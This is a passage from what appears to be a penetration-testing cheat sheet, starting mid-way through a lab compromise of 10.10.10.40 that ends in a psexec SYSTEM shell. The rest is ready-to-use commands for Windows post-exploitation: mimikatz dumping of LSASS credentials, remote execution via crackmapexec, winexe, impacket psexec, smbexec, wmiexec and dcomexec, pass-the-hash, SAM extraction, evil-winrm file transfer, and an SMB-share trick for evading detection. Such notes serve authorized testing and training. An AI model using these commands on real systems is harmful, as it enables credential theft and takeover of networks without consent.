[*] No server (-s) specified, defaulting to localhost.
[+] Success! New NTLM hash: 2081d1de9b8df44ed3a37963ae802d10
```
#### Login with the new password
```
┌──(kali㉿bughunt3r)-[/opt/win]
└─$ python3 psexec.py Administrator:akrech404@10.10.10.40
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.40.....
[*] Found writable share ADMIN$
[*] Uploading file MiONxDaQ.exe
[*] Opening SVCManager on 10.10.10.40.....
[*] Creating service xXQL on 10.10.10.40.....
[*] Starting service xXQL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> 
```
# mimikatz

If you have an LSASS dump, you can use the minidump module
```
mimikatz # sekurlsa::minidump lsass.DMP
```
```
mimikatz # sekurlsa::logonPasswords /full
```
* You can upload mimikatz to a remote machine with smbclient
* Or you can use crackmapexec
* Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.exe
```
crackmapexec IP -u user -p password -M mimikatz
```

* Then you can execute remotely through winexe

```
winexe -U admin%password //IP C:\\Windows\\mimikatz.exe
```
* Password dumping
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords /full
```
* In case of Mimikatz is trigerred on the target machine, you can try bring it up using network share
```
sudo python smbserver.py SHARE /home/xxxxx/share_path/
```
```
sudo ./venv/bin/crackmapexec smb IP -u "xxx" -p "xxx" -X '\\share_ip\SHARE\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords /full" exit > \\share_ip\SHARE\mimiout_$env:computername.txt'
```
* In order to be stealthier, you can even do the same for procdump
```
sudo ./venv/bin/crackmapexec smb IP -u "xxx" -p "xxx" -X '\\share_ip\SHARE\procdump.exe "TODO"'
```
------------------------
# impacket

#### [github link](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_24)

### psexec

* remote code execution 
```
python psexec.py domain/user:password@IP <command>
```
* Shell via pass-the-hash:
```
python psexec.py -hashes:<hash> <user_name>@<remote_hostname>
```
* Shell via pass-the-password:
```
python psexec.py Administrator:<password>4@<remote_hostname>
```
* Shell via no-pass
```
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
### smbexec

* remote code execution
```
python smbexec.py domain/user:password@IP <command>
```

### wmiexec

* remote code execution 
```
python wmiexec.py domain/user:password@IP <command>
```
### dcomexec

* remode code execution
```
python dcomexec.py domain/user:password@IP <command>
```

### crackmapexec
* over a subnet and extract SAM file:
```
python crackmapexec -u Administrator -H :011AD41795657A8ED80AB3FF6F078D03 <target_IP> --sam
```
### smbclient
Browse shares via pass-the-hash:
```
python smbclient.py <target_domain>/Administrator@target_IP -hashes 01[...]03:01[...]03
```
* a generic SMB client that will let you list shares and files, rename,
* upload and download files and create and delete directories

```
smbclient.py domain/user:password@IP
smbclient.py -dc-ip <attacker_IP> -target-ip <target_IP>> domain/user:password
```
--------------------------
## evil-wimrm

#### [github link](https://github.com/Hackplayers/evil-winrm)

install with gem `sudo gem install evil-winrm`

if you are using kali-linux; then it can be easily installed by `sudo apt install evil-winrm`

### Simple usage

* `connect` with the target
```
evil-winrm -i <target_IP> -u <user> -p <password>
```

* `download` & `upload` files

`upload`
```
upload local_filename (destination_filename)
```
`download`
```
download remote_filename (destination_filename)
```


---------------------------------------------------------------------------------------------------------
# Extra notes

### make NTML hash from password

```
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```

### snap

```
sudo apt install snap
```
```
service snapd start
```
```
sudo systemctl start snapd.service
```
----------------------------------------------------------------------------------------------------------
